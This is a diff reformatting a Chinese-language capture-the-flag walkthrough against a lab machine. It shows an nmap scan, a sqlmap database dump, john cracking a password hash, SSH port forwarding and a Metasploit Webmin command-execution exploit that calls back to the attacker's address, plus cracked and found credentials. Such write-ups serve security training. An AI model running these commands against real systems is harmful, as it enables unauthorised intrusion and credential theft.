@@ -1,6 +1,7 @@
-#服务扫描
+# 服务扫描
+```
 ┌──(root💀kali)-[~]
-└─# nmap -sV 10.10.107.45
+└─#  nmap -sV 10.10.107.45
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-30 06:01 EDT
 Nmap scan report for 10.10.107.45
 Host is up (0.31s latency).
@@ -12,12 +13,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 19.61 seconds
+```
 
-
-#What is the name of the large cartoon avatar holding a sniper on the forum?
+# What is the name of the large cartoon avatar holding a sniper on the forum?
 谷歌搜索图片：Agent 47
 
-#burpsuite抓包，放到sqlmap上跑，dump出整个数据
+# burpsuite抓包，放到sqlmap上跑，dump出整个数据
+```
 sqlmap -r request.txt --dbms=mysql --dump 
 
 Database: db
@@ -51,27 +53,28 @@ Table: post
 [06:43:59] [WARNING] your sqlmap version is outdated
 
 [*] ending @ 06:43:59 /2021-08-30/
+```
 
 
-
-#用john破解上面agent47的哈希密码
+# 用john破解上面agent47的哈希密码
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
 
 密码是：videogamer124
 
 
 
-#转发
+# 转发
 ssh -L 10000:localhost:10000 agent47@10.10.27.20
 
-#本地访问
+# 本地访问
 http://localhost:10000
 
-#web登录密码也是
+# web登录密码也是
 agent47：videogamer124
 
 
-#msf 提权
+# msf 提权
+```
 msf6 exploit(unix/webapp/webmin_show_cgi_exec) > options
 
 Module options (exploit/unix/webapp/webmin_show_cgi_exec):
@@ -105,10 +108,10 @@ Exploit target:
 msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set lhost tun0
 lhost => 10.13.21.169
 msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run
+```
 
 
 
-
-#数据库密码
+# 数据库密码
 /var/www/html/index.php 
 root:3kSMMS47qZEBgFUe
